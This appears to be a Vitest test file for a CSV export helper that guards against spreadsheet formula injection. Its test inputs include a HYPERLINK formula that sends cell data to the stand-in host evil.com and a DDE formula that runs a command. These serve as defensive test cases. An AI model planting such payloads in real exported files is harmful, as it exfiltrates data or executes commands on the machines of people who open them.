import { describe, expect, it } from 'vitest';
import { csvCell } from '@/lib/admin/csv';

describe('csvCell', () => {
  it('passes plain text through unchanged', () => {
    expect(csvCell('Ada Lovelace')).toBe('Ada Lovelace');
  });

  it('applies RFC-4180 quoting to fields with comma, quote or newline', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('renders plain numbers without a guard', () => {
    expect(csvCell(42)).toBe('42');
    expect(csvCell(19.5)).toBe('19.5');
  });

  it('neutralizes a leading-= formula (HYPERLINK exfiltration attack)', () => {
    expect(csvCell('=HYPERLINK("https://evil.com?x="&A1,"x")')).toBe(
      '"\'=HYPERLINK(""https://evil.com?x=""&A1,""x"")"',
    );
  });

  it('neutralizes a DDE command-execution formula', () => {
    // No comma/quote/newline → no RFC quoting, just the apostrophe text-guard.
    expect(csvCell("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it('guards every formula-trigger prefix character', () => {
    expect(csvCell('+1+1')).toBe("'+1+1");
    expect(csvCell('-1+1')).toBe("'-1+1");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\t=1')).toBe("'\t=1");
    expect(csvCell('\r=1')).toBe("'\r=1");
  });

  it('guards a leading newline then re-quotes for RFC-4180 (newline cell)', () => {
    // Leading \n is a formula trigger → apostrophe guard; the embedded newline
    // also forces RFC-4180 quoting, so the guarded value is wrapped in quotes.
    expect(csvCell('\n=1')).toBe('"\'\n=1"');
  });
});
